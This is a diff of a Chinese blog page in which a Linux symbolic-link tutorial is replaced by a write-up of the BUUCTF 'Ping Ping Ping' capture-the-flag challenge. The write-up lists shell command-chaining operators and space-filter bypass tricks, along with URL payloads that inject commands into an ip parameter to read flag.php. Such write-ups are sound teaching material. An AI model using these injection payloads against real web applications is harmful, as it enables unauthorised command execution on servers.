@@ -14,7 +14,7 @@
   
   
   <title>
-    linux软连接的使用 |
+    【BUUCTF】[GXYCTF2019] Ping Ping Ping |
     
     Cyberangel
   </title>
@@ -29,24 +29,27 @@
 
   
   
-    <meta name="description" content="linux 软连接的使用软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同不的链接。 具体用法是：ln -s 源文件 目标文件。  当 我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在其它的 目录下用ln命令链接（link）就可以，不必重复的占用磁盘空间。 例如： 1ln&#96; &#96;-s &#96;&#96;&#x2F;usr&#x2F;local&#x2F;my">
+    <meta name="description" content="【BUUCTF】[GXYCTF2019] Ping Ping Ping考点命令联合执行12345678;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux软连接的使用">
-<meta property="og:url" content="http://example.com/2024/11/26/linux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:title" content="【BUUCTF】[GXYCTF2019] Ping Ping Ping">
+<meta property="og:url" content="http://example.com/2024/11/30/%E3%80%90BUUCTF%E3%80%91[GXYCTF2019]%20Ping%20Ping%20Ping/index.html">
 <meta property="og:site_name" content="Cyberangel">
-<meta property="og:description" content="linux 软连接的使用软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同不的链接。 具体用法是：ln -s 源文件 目标文件。  当 我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在其它的 目录下用ln命令链接（link）就可以，不必重复的占用磁盘空间。 例如： 1ln&#96; &#96;-s &#96;&#96;&#x2F;usr&#x2F;local&#x2F;my">
+<meta property="og:description" content="【BUUCTF】[GXYCTF2019] Ping Ping Ping考点命令联合执行12345678;     前面的执行完执行后面的|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         ||    当前面的执行出错时（为假）执行后面的&amp;     将任务置于后台执行&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/BuYERsAFoc2WfXi.png">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/x7nrqJRLm8PijoH.png">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/ZVxqeWQ32p6kfjd.png">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/MgsVWdBwJubq8fm.png">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/MgsVWdBwJubq8fm.png">
-<meta property="og:image" content="https://s2.loli.net/2024/11/27/FJLzIxsmlRBtcuV.png">
-<meta property="article:published_time" content="2024-11-26T09:09:03.000Z">
-<meta property="article:modified_time" content="2024-11-27T13:37:11.597Z">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/i1ZHL2R5GyUXFPh.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/kZ3F28hVyYtbRql.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/SXJZcKWo6ek7stG.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/EMPoBW6CDmIgvxb.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/NmHxhjiaIpnMwl2.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/O1WNsr4e2Buf7Hi.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/IX3JZ1jayzVSPBs.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/jFJ14LUDiZ2HqI5.png">
+<meta property="og:image" content="https://s2.loli.net/2024/11/30/r8vkzTBiqYJx3gZ.png">
+<meta property="article:published_time" content="2024-11-30T13:25:34.000Z">
+<meta property="article:modified_time" content="2024-11-30T13:27:06.345Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2024/11/27/BuYERsAFoc2WfXi.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/11/30/i1ZHL2R5GyUXFPh.png">
   
   
     <link rel="alternate" href="/atom.xml" title="Cyberangel" type="application/atom+xml">
@@ -157,7 +160,7 @@
 <header id="header">
   
     
-      <img fetchpriority="high" src="/images/banner.webp" alt="linux软连接的使用">
+      <img fetchpriority="high" src="/images/banner.webp" alt="【BUUCTF】[GXYCTF2019] Ping Ping Ping">
     
   
   <div id="header-outer">
@@ -166,7 +169,7 @@
         
         
           <a href="/" id="logo">
-            <h1 data-aos="slide-up">linux软连接的使用</h1>
+            <h1 data-aos="slide-up">【BUUCTF】[GXYCTF2019] Ping Ping Ping</h1>
           </a>
         
       
@@ -182,13 +185,13 @@
 
         <div id="content">
           
-          <section id="main"><article id="post-linux软连接的使用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="【buuctf】[gxyctf2019]-【BUUCTF】[GXYCTF2019] Ping Ping Ping" class="h-entry article article-type-【buuctf】[gxyctf2019]" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner" data-aos="fade-up">
     <div class="article-meta">
       <div class="article-date">
-  <a href="/2024/11/26/linux%E8%BD%AF%E8%BF%9E%E6%8E%A5%E7%9A%84%E4%BD%BF%E7%94%A8/" class="article-date-link" data-aos="zoom-in">
-    <time datetime="2024-11-26T09:09:03.000Z" itemprop="datePublished">2024-11-26</time>
-    <time style="display: none;" id="post-update-time">2024-11-27</time>
+  <a href="/2024/11/30/%E3%80%90BUUCTF%E3%80%91%5BGXYCTF2019%5D%20Ping%20Ping%20Ping/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2024-11-30T13:25:34.000Z" itemprop="datePublished">2024-11-30</time>
+    <time style="display: none;" id="post-update-time">2024-11-30</time>
   </a>
 </div>
 
@@ -201,49 +204,42 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
       
-        <h1 id="linux-软连接的使用"><a href="#linux-软连接的使用" class="headerlink" title="linux 软连接的使用"></a>linux 软连接的使用</h1><p>软连接是linux中一个常用命令，它的功能是为某一个文件在另外一个位置建立一个同不的链接。</p>
-<p>具体用法是：ln -s 源文件 目标文件。 </p>
-<p>当 我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在其它的 目录下用ln命令链接（link）就可以，不必重复的占用磁盘空间。</p>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln` `-s ``/usr/local/mysql/bin/mysql` `/usr/bin</span><br></pre></td></tr></table></figure>
+        <h1 id="【BUUCTF】-GXYCTF2019-Ping-Ping-Ping"><a href="#【BUUCTF】-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="【BUUCTF】[GXYCTF2019] Ping Ping Ping"></a>【BUUCTF】[GXYCTF2019] Ping Ping Ping</h1><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><h3 id="命令联合执行"><a href="#命令联合执行" class="headerlink" title="命令联合执行"></a>命令联合执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;     前面的执行完执行后面的</span><br><span class="line">|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）         </span><br><span class="line">||    当前面的执行出错时（为假）执行后面的</span><br><span class="line">&amp;     将任务置于后台执行</span><br><span class="line">&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真</span><br><span class="line">%0a  （换行）</span><br><span class="line">%0d  （回车）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>这样我们就对&#x2F;usr&#x2F;bin目录下的mysql命令创建了软连接</p>
-<p><strong>使用方式</strong></p>
-<p>创建软链接</p>
-<p>ln  -s [源文件或目录] [目标文件或目录]</p>
-<p>例：</p>
-<p>当前路径创建test 引向&#x2F;var&#x2F;www&#x2F;test 文件夹 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln` `–s ``/var/www/test` `test</span><br></pre></td></tr></table></figure>
+<h3 id="命令绕过空格方法有："><a href="#命令绕过空格方法有：" class="headerlink" title="命令绕过空格方法有："></a>命令绕过空格方法有：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$&#123;IFS&#125;$9</span><br><span class="line">&#123;IFS&#125;</span><br><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //$1改成$加其他数字貌似都行</span><br><span class="line">IFS</span><br><span class="line">&lt; </span><br><span class="line">&lt;&gt; </span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line">%20   (space)</span><br><span class="line">%09   (tab)</span><br><span class="line">X=$&#x27;cat\x09./flag.php&#x27;;$X       （\x09表示tab，也可以用\x20）</span><br><span class="line"></span><br><span class="line">ps:有时会禁用cat:</span><br><span class="line">解决方法是使用tac反向输出命令：</span><br><span class="line">linux命令中可以加\，所以甚至可以ca\t /fl\ag</span><br></pre></td></tr></table></figure>
 
-<p>创建&#x2F;var&#x2F;test 引向&#x2F;var&#x2F;www&#x2F;test 文件夹 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln` `–s ``/var/www/test`  `/var/test</span><br></pre></td></tr></table></figure>
+<h3 id="内联执行"><a href="#内联执行" class="headerlink" title="内联执行"></a>内联执行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br><span class="line"></span><br><span class="line">$IFS在Linux下表示为空格</span><br><span class="line">$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$9或$IFS垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>删除软链接</p>
-<p>和删除普通的文件是一样的，删除都是使用rm来进行操作</p>
-<p>例：</p>
-<p>删除test</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#推荐使用``unlink ``test` `#其次用法``rm` `test` `#不推荐用法``rm` `-rf ``test</span><br></pre></td></tr></table></figure>
+<h3 id="开始解题"><a href="#开始解题" class="headerlink" title="开始解题"></a>开始解题</h3><p><img src="https://s2.loli.net/2024/11/30/i1ZHL2R5GyUXFPh.png" alt="image-20241130210335943"></p>
+<p>打开题目看到这个东西，大胆猜测这是让你在url中拼接ip参数GET类型传参</p>
+<p>不放心就抓个包看看</p>
+<p><img src="https://s2.loli.net/2024/11/30/kZ3F28hVyYtbRql.png" alt="image-20241130210653504"></p>
+<p>确实是GET类型传参</p>
+<p>光ping各ip可不够，这里考的应该是命令联合执行，利用；符号拼接前后命令使其能够都执行</p>
+<p>这里我执行ls命令看看网页当前目录下有些啥，我嘞个豆，flag.php，这下不得不看看了</p>
+<p><img src="https://s2.loli.net/2024/11/30/SXJZcKWo6ek7stG.png" alt="image-20241130211028338"></p>
+<p>想要查看flag.php,但是提示我们空格被过滤掉了，立马进行绕过，试了几次后发现$IFS&amp;1可以</p>
+<p><img src="https://s2.loli.net/2024/11/30/EMPoBW6CDmIgvxb.png" alt="image-20241130211126165"></p>
+<p>不是哥们，flag都给我过滤了，这我拿头打</p>
+<p><img src="https://s2.loli.net/2024/11/30/NmHxhjiaIpnMwl2.png" alt="image-20241130211330739"></p>
+<p>哎，是不是还有个index.php还没看，去看看有啥线索没有</p>
+<p>如下是一段php代码，</p>
+<p><img src="https://s2.loli.net/2024/11/30/O1WNsr4e2Buf7Hi.png" alt="image-20241130211444057"></p>
+<p>代码审计后如下，可以看出来<code>空格 </code>  <code>bash </code>   <code>flag这四个字母依次匹配</code>     <code>&amp; / ? * &lt; &gt; | &#39; &quot; \ ( ) [ ] &#123; &#125;</code> 都被过滤了</p>
+<p><img src="https://s2.loli.net/2024/11/30/IX3JZ1jayzVSPBs.png" alt="image-20241130211519981"></p>
+<p>关键在于shell_exec这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell_exec`函数执行一个系统命令，并将命令的输出赋值给变量`$a</span><br></pre></td></tr></table></figure>
 
-<p><strong>不推荐使用rm -rf，在使用rm -rf删除时，如果链接目标是目录时千万要小心，使用 rm -rf test&#x2F; 时你会发现，软连接并没有被删除，而源目录下的文件会被删除！</strong></p>
-<p>修改软链接</p>
-<p>ln –snf  [新的源文件或目录] [目标文件或目录]</p>
-<p>这将会修改原有的链接地址为新的地址</p>
-<p>例如：</p>
-<p>创建一个软链接</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln` `–s ``/var/www/test`  `/var/test</span><br></pre></td></tr></table></figure>
+<p><strong>既然前面会将flag这四个字母依次匹配，那么我们将其中一个或多个字母用$a变量替换就可以绕过过滤了</strong></p>
+<p>至此，即可构造出payload，后面的结果都是一个个试出来的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php    没flag</span><br><span class="line">?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php    过滤</span><br><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php    有flag</span><br></pre></td></tr></table></figure>
 
-<p>修改指向的新路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln` `–snf ``/var/www/test1`  `/var/test</span><br></pre></td></tr></table></figure>
+<p>当然，一个变量也有可能被过滤，不妨多构造几个变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1;a=fl;b=ag;cat$IFS$1$a$b.php 过滤</span><br><span class="line">?ip=127.0.0.1;b=ag;a=fl;cat$IFS$1$a$b.php 有flag</span><br></pre></td></tr></table></figure>
 
-<p><strong>常用参数：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">　　-f : 链结时先将与 dist 同档名的档案删除</span><br><span class="line">　　-d : 允许系统管理者硬链结自己的目录</span><br><span class="line">　　-i : 在删除与 dist 同档名的档案时先进行询问</span><br><span class="line">　　-n : 在进行软连结时，将 dist 视为一般的档案</span><br><span class="line">　　-s : 进行软链结(symbolic link)</span><br><span class="line">　　-v : 在连结之前显示其档名</span><br><span class="line">　　-b : 将在链结时会被覆写或删除的档案进行备份</span><br><span class="line">　　-S SUFFIX : 将备份的档案都加上 SUFFIX 的字尾</span><br><span class="line">　　-V METHOD : 指定备份的方式</span><br><span class="line">　　--help : 显示辅助说明</span><br><span class="line">　　--version : 显示版本</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2024/11/27/BuYERsAFoc2WfXi.png" alt="image-20241119221207279"></p>
-<p><img src="https://s2.loli.net/2024/11/27/x7nrqJRLm8PijoH.png" alt="image-20241119221213318"></p>
-<p><img src="https://s2.loli.net/2024/11/27/ZVxqeWQ32p6kfjd.png" alt="image-20241119221230458"></p>
-<p><img src="https://s2.loli.net/2024/11/27/MgsVWdBwJubq8fm.png" alt="image-20241119221243815"></p>
-<p><img src="https://s2.loli.net/2024/11/27/MgsVWdBwJubq8fm.png"></p>
-<p><img src="https://s2.loli.net/2024/11/27/FJLzIxsmlRBtcuV.png" alt="image-20241119221303687"></p>
+<p>利用payload构造url进入网页后，查看源代码即可得到flag</p>
+<p><img src="https://s2.loli.net/2024/11/30/jFJ14LUDiZ2HqI5.png" alt="image-20241130212414441"></p>
+<p><img src="https://s2.loli.net/2024/11/30/r8vkzTBiqYJx3gZ.png" alt="image-20241130212248283"></p>
 
       
     </div>
@@ -262,35 +258,19 @@
   
   <nav id="article-nav" data-aos="fade-up">
     
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          
-          
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="git常用命令" class="lazyload">
-          
-        
-        <a href="/2024/11/26/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"></a>
-        <div class="article-nav-caption">前一篇</div>
-        <h3 class="article-nav-title">
-          
-            git常用命令
-          
-        </h3>
-      </div>
-    
     
     <div class="article-nav-link-wrap article-nav-link-right">
       
         
         
-          <img data-src="/images/banner.webp" data-sizes="auto" alt="什么是外链" class="lazyload">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="BUUCTF web [极客大挑战 2019]Knife 1" class="lazyload">
         
       
-      <a href="/2024/11/26/%E4%BB%80%E4%B9%88%E6%98%AF%E5%A4%96%E9%93%BE/"></a>
+      <a href="/2024/11/28/BUUCTF%20web%20%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DKnife%201/"></a>
       <div class="article-nav-caption">后一篇</div>
       <h3 class="article-nav-title">
         
-          什么是外链
+          BUUCTF web [极客大挑战 2019]Knife 1
         
       </h3>
     </div>
@@ -315,7 +295,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">linux 软连接的使用</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90BUUCTF%E3%80%91-GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">【BUUCTF】[GXYCTF2019] Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">考点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%81%94%E5%90%88%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.1.</span> <span class="toc-text">命令联合执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E6%96%B9%E6%B3%95%E6%9C%89%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">命令绕过空格方法有：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="toc-number">1.1.4.</span> <span class="toc-text">开始解题</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
@@ -439,7 +419,7 @@
   <h3 class="toc-title">文章目录</h3>
   <div class="sidebar-toc-wrapper toc-div-class" >
       
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux-%E8%BD%AF%E8%BF%9E%E6%8E%A5%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">linux 软连接的使用</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E3%80%90BUUCTF%E3%80%91-GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.</span> <span class="toc-text">【BUUCTF】[GXYCTF2019] Ping Ping Ping</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">考点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%81%94%E5%90%88%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.1.</span> <span class="toc-text">命令联合执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E6%96%B9%E6%B3%95%E6%9C%89%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">命令绕过空格方法有：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.3.</span> <span class="toc-text">内联执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="toc-number">1.1.4.</span> <span class="toc-text">开始解题</span></a></li></ol></li></ol></li></ol>
       
   </div>
 </div>
